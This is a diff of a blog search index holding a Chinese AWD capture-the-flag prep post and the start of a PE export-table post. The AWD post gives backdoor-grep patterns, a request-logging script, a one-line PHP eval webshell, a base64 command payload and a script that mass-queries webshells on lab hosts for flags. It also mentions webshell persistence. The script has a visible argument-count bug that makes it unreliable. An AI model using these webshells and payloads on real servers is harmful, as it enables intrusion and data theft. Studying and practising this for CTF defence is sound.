@@ -632,6 +632,49 @@
       </tags>
   </entry>
   <entry>
+    <title>awd知识梳理</title>
+    <url>/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
+    <content><![CDATA[<p>由于一个月后需要参加一项awd比赛，为了防止过去之后什么也不懂的情况发生，写下这篇笔记用于记录整理awd比赛可能会用到的一些零零碎碎的知识点。</p>
+<h2 id="0X01-目录索引"><a href="#0X01-目录索引" class="headerlink" title="0X01 目录索引"></a>0X01 目录索引</h2><ol>
+<li>加固阶段</li>
+<li>攻防阶段</li>
+</ol>
+<h3 id="1-加固阶段"><a href="#1-加固阶段" class="headerlink" title="1.加固阶段"></a>1.加固阶段</h3><ol>
+<li><p>修改ssh登陆密码</p>
+<p>首先根据主办方提供的ssh账号登陆到我们的服务器，并在第一时间下通过passwd修改密码，最好改为强密码，避免其他队伍通过弱口令或默认口令进入我们服务器。<img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022155257543.png" alt="image-20211022155257543"></p>
+</li>
+<li><p>备份mysql数据库、网站源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -p 数据库名 &gt; 备份文件 <span class="comment">#进行数据库备份</span></span><br><span class="line">source C:\User\<span class="number">86156</span>\Desktop\web\test.sql <span class="comment">#进入数据库，将数据库备份文件导入</span></span><br><span class="line">tar -czvf 打包文件.tar.gz  打包目录 </span><br><span class="line">tar -zxvf 打包文件  <span class="comment">#解压打包文件</span></span><br><span class="line">利用python3 -m http.server <span class="number">8080</span>| python -m SimpleHTTPServer <span class="number">8080</span>|scp 命令将文件传输至本机进行审计</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
+<li><p>进入web主目录审计源码，查找隐藏后门文件以及webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al #列出目录内所有文件，避免.xxx.php 从而被隐藏后门文件。</span><br><span class="line">crontab -e #查看计划任务表</span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161419311.png" alt="image-20211022161419311"></p>
+</li>
+<li><p>利用find | xrags grep “xxx” 粗略查找网站中的隐藏后门，找到后对其进行删除操作</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html |xargs grep <span class="string">&quot;system&quot;</span> </span><br><span class="line"><span class="comment">#system、eval、assert、exec、passthru、shell_exec都要留心查一下</span></span><br><span class="line"><span class="comment">#include、require、include_once 、require_once等包含函数也可留意</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161723171.png" alt="image-20211022161723171"></p>
+<p>​            5.后门排查完毕后，对代码进行审计，重点查看upload以及sql，若主办方还提供D盾等排查后门工具，可一起利用d盾进行后门排查</p>
+<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022163226399.png" alt="image-20211022163226399"></p>
+<h3 id="2-攻防阶段"><a href="#2-攻防阶段" class="headerlink" title="2.攻防阶段"></a>2.攻防阶段</h3><p>1安排上流量监控脚本，筛选其他攻击队的可利用payload放入自己武器库之中</p>
+<p>使用时需要将waf.php include包含进文件之中。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;./logs&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>)</span><br><span class="line"><span class="variable">$headers</span>[str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, substr(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$header</span> = getallheaders();</span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">logging(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.print_r(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>同时可联用apache、nginx的日志文件，通过grep筛查拿到可利用payload</p>
+<p>2.根据后门文件写批量拿flag脚本，人菜写的脚本烂，诸位师傅别骂哈</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">###  目前需求如下：</span></span><br><span class="line"><span class="comment"># 1，第一遍拿到存活主机并尝试通过get方式拿到flag，并将flag存入文件内</span></span><br><span class="line"><span class="comment"># 2. 回显为空的，将存活Ip放入一个Post_url列表中，再在下方通过post_getflag方式走一遍流程，尝试拿flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用Get请求方式请求flag</span></span><br><span class="line"></span><br><span class="line">def get_flag(url,payload,flag,header):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;开始探测:&quot;</span>,url.format(i))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url.format(i),params=payload,timeout=<span class="number">2</span>,headers=header)</span><br><span class="line">            res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;状态码:&quot;</span>,res.status_code)</span><br><span class="line">            <span class="keyword">if</span> (flag in str(res.text)):</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;Get flag successful!&quot;</span>)</span><br><span class="line">                f = open(<span class="string">&quot;getflag.txt&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(res.text)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (res.status_code == <span class="number">200</span>):</span><br><span class="line">                    post_urls.append(url.format(i))</span><br><span class="line">                    <span class="comment"># f = open(&quot;Post_getflag.txt&quot;, mode=&quot;a&quot;)</span></span><br><span class="line">                    <span class="comment"># #利用\r\n将写入的数据换行</span></span><br><span class="line">                    <span class="comment"># f.write(url.format(i)+&quot;\r&quot;)</span></span><br><span class="line">                    <span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line">        except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            e</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST抓取flag</span></span><br><span class="line">def post_Getflag(payload,flag):</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">&#x27;pass&#x27;</span>]=<span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span></span><br><span class="line">    <span class="keyword">for</span> url in post_urls:</span><br><span class="line">        <span class="keyword">print</span>(url)</span><br><span class="line">        res = requests.post(url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">        res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@eval(base64_decode($_POST[pass]));    一句话木马</span></span><br><span class="line"><span class="comment">#system(&quot;more flag.txt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#开始嗨皮</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#此处偷了个懒，默认按照192.168.155.0/24段内的主机是awd内网靶机环境</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.155.&#123;0&#125;/pcap.php&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">    post_urls=[]</span><br><span class="line">    get_flag(url,payload,flag,header)</span><br><span class="line">    post_Getflag(payload,flag,header)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;完成！&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在获取flag的时候，还可以通过写入不死马、计划任务上马等手段进行权限维持，避免后门被清理无法再下轮flag投放时获取不到。</p>
+<p>简单来说，攻防阶段主要是快速编写批量爆破flag脚本并运行读取，另外根据日志或流控脚本发现其他未修复漏洞进行及时修复避免失分。</p>
+<p>今天先更新到这里，以后如果还有其他内容还会陆续更新本文….</p>
+]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WinRM-横向移动</title>
     <url>/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
     <content><![CDATA[<p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
@@ -705,49 +748,6 @@
       </categories>
       <tags>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>awd知识梳理</title>
-    <url>/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
-    <content><![CDATA[<p>由于一个月后需要参加一项awd比赛，为了防止过去之后什么也不懂的情况发生，写下这篇笔记用于记录整理awd比赛可能会用到的一些零零碎碎的知识点。</p>
-<h2 id="0X01-目录索引"><a href="#0X01-目录索引" class="headerlink" title="0X01 目录索引"></a>0X01 目录索引</h2><ol>
-<li>加固阶段</li>
-<li>攻防阶段</li>
-</ol>
-<h3 id="1-加固阶段"><a href="#1-加固阶段" class="headerlink" title="1.加固阶段"></a>1.加固阶段</h3><ol>
-<li><p>修改ssh登陆密码</p>
-<p>首先根据主办方提供的ssh账号登陆到我们的服务器，并在第一时间下通过passwd修改密码，最好改为强密码，避免其他队伍通过弱口令或默认口令进入我们服务器。<img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022155257543.png" alt="image-20211022155257543"></p>
-</li>
-<li><p>备份mysql数据库、网站源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -p 数据库名 &gt; 备份文件 <span class="comment">#进行数据库备份</span></span><br><span class="line">source C:\User\<span class="number">86156</span>\Desktop\web\test.sql <span class="comment">#进入数据库，将数据库备份文件导入</span></span><br><span class="line">tar -czvf 打包文件.tar.gz  打包目录 </span><br><span class="line">tar -zxvf 打包文件  <span class="comment">#解压打包文件</span></span><br><span class="line">利用python3 -m http.server <span class="number">8080</span>| python -m SimpleHTTPServer <span class="number">8080</span>|scp 命令将文件传输至本机进行审计</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
-<li><p>进入web主目录审计源码，查找隐藏后门文件以及webshell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al #列出目录内所有文件，避免.xxx.php 从而被隐藏后门文件。</span><br><span class="line">crontab -e #查看计划任务表</span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161419311.png" alt="image-20211022161419311"></p>
-</li>
-<li><p>利用find | xrags grep “xxx” 粗略查找网站中的隐藏后门，找到后对其进行删除操作</p>
-</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html |xargs grep <span class="string">&quot;system&quot;</span> </span><br><span class="line"><span class="comment">#system、eval、assert、exec、passthru、shell_exec都要留心查一下</span></span><br><span class="line"><span class="comment">#include、require、include_once 、require_once等包含函数也可留意</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161723171.png" alt="image-20211022161723171"></p>
-<p>​            5.后门排查完毕后，对代码进行审计，重点查看upload以及sql，若主办方还提供D盾等排查后门工具，可一起利用d盾进行后门排查</p>
-<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022163226399.png" alt="image-20211022163226399"></p>
-<h3 id="2-攻防阶段"><a href="#2-攻防阶段" class="headerlink" title="2.攻防阶段"></a>2.攻防阶段</h3><p>1安排上流量监控脚本，筛选其他攻击队的可利用payload放入自己武器库之中</p>
-<p>使用时需要将waf.php include包含进文件之中。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;./logs&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>)</span><br><span class="line"><span class="variable">$headers</span>[str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, substr(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$header</span> = getallheaders();</span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">logging(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.print_r(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
-
-<p>同时可联用apache、nginx的日志文件，通过grep筛查拿到可利用payload</p>
-<p>2.根据后门文件写批量拿flag脚本，人菜写的脚本烂，诸位师傅别骂哈</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">###  目前需求如下：</span></span><br><span class="line"><span class="comment"># 1，第一遍拿到存活主机并尝试通过get方式拿到flag，并将flag存入文件内</span></span><br><span class="line"><span class="comment"># 2. 回显为空的，将存活Ip放入一个Post_url列表中，再在下方通过post_getflag方式走一遍流程，尝试拿flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用Get请求方式请求flag</span></span><br><span class="line"></span><br><span class="line">def get_flag(url,payload,flag,header):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;开始探测:&quot;</span>,url.format(i))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url.format(i),params=payload,timeout=<span class="number">2</span>,headers=header)</span><br><span class="line">            res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;状态码:&quot;</span>,res.status_code)</span><br><span class="line">            <span class="keyword">if</span> (flag in str(res.text)):</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;Get flag successful!&quot;</span>)</span><br><span class="line">                f = open(<span class="string">&quot;getflag.txt&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(res.text)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (res.status_code == <span class="number">200</span>):</span><br><span class="line">                    post_urls.append(url.format(i))</span><br><span class="line">                    <span class="comment"># f = open(&quot;Post_getflag.txt&quot;, mode=&quot;a&quot;)</span></span><br><span class="line">                    <span class="comment"># #利用\r\n将写入的数据换行</span></span><br><span class="line">                    <span class="comment"># f.write(url.format(i)+&quot;\r&quot;)</span></span><br><span class="line">                    <span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line">        except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            e</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST抓取flag</span></span><br><span class="line">def post_Getflag(payload,flag):</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">&#x27;pass&#x27;</span>]=<span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span></span><br><span class="line">    <span class="keyword">for</span> url in post_urls:</span><br><span class="line">        <span class="keyword">print</span>(url)</span><br><span class="line">        res = requests.post(url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">        res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@eval(base64_decode($_POST[pass]));    一句话木马</span></span><br><span class="line"><span class="comment">#system(&quot;more flag.txt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#开始嗨皮</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#此处偷了个懒，默认按照192.168.155.0/24段内的主机是awd内网靶机环境</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.155.&#123;0&#125;/pcap.php&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">    post_urls=[]</span><br><span class="line">    get_flag(url,payload,flag,header)</span><br><span class="line">    post_Getflag(payload,flag,header)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;完成！&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在获取flag的时候，还可以通过写入不死马、计划任务上马等手段进行权限维持，避免后门被清理无法再下轮flag投放时获取不到。</p>
-<p>简单来说，攻防阶段主要是快速编写批量爆破flag脚本并运行读取，另外根据日志或流控脚本发现其他未修复漏洞进行及时修复避免失分。</p>
-<p>今天先更新到这里，以后如果还有其他内容还会陆续更新本文….</p>
-]]></content>
-      <tags>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1708,6 +1708,539 @@
       </tags>
   </entry>
   <entry>
+    <title>PE结构-导出表(3)</title>
+    <url>/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/</url>
+    <content><![CDATA[<h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a><strong>导出表</strong></h1><h4 id="导出表的作用"><a href="#导出表的作用" class="headerlink" title="导出表的作用"></a><strong>导出表的作用</strong></h4><p>一个可执行程序是由<strong>多个PE文件</strong>构成的</p>
+<p>利用EverEdit.exe为例，查看运行他所需的所有模块</p>
+<p>使用od载入程序，利用<em>e</em>查看载入的模块（dll与exe程序，PE文件载入内存后可称作模块）</p>
+<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112208833.png" alt="image-20211015112208833"></p>
+<p>我们可以看出，该程序除了载入自身exe程序外，还在外部动态链接了大量dll文件，这些dll为程序提供了运行所需的一些函数</p>
+<p>就比如MessageBoxA的弹窗函数就是由User32.dll模块提供</p>
+<p>以上的每个模块都发挥着其作用，使得程序得以正常运行</p>
+<p>一个程序引用哪些模块是由<strong>其导入表</strong>决定的</p>
+<p>与导入表相对应的便是<strong>导出表</strong>，导出表则是决定当前PE文件<strong>能给其他PE文件提供的函数</strong></p>
+<p>拿User32.dll举例，它的导出表结构中，一定包含着MessageBoxA这个函数,否则它不可能提供这个函数给程序。</p>
+<hr>
+<p><strong>导入表与导出表概念总结</strong>:</p>
+<ul>
+<li>导出表:设置本PE文件可以将什么函数提供给其他PE文件</li>
+<li>导入表:该PE文件可以使用哪些PE文件。</li>
+</ul>
